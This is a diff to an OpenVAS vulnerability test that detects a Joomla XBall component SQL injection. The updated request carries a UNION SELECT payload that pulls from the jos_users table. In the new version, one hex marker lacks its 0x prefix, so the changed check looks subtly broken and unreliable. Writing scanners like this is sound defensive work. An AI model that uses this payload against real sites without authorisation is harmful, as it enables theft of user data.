@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_com_xball_sql_inj_vuln.nasl 10754 2018-08-03 10:38:29Z ckuersteiner $
+# $Id: gb_joomla_com_xball_sql_inj_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # Joomla XBall Component SQL Injection Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:joomla:joomla";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802569");
-  script_version("$Revision: 10754 $");
+  script_version("$Revision: 11435 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-03 12:38:29 +0200 (Fri, 03 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-01-23 15:38:16 +0530 (Mon, 23 Jan 2012)");
 
   script_name("Joomla XBall Component SQL Injection Vulnerability");
@@ -82,10 +82,10 @@ if (dir == "/")
 
 url = dir + "/index.php?option=com_xball&controller=teams&task=show&" +
             "team_id=-98+union+select+0,1,2,3,4,group_concat" +
-            "(0x4f70656e564153,0x3a,0x4f70656e564153,0x3a),6,7,8,9," +
+            "(0x53514c692d54657374,0x3a,53514c692d54657374,0x3a),6,7,8,9," +
             "10,11,12,13,14,15,16,17+from+jos_users";
 
-if (http_vuln_check(port: port, url: url, pattern: "OpenVAS:OpenVAS")) {
+if (http_vuln_check(port: port, url: url, pattern: "SQLi-Test:SQLi-Test")) {
   report = report_vuln_url(port: port, url: url);
   security_message(port: port, data: report);
   exit(0);
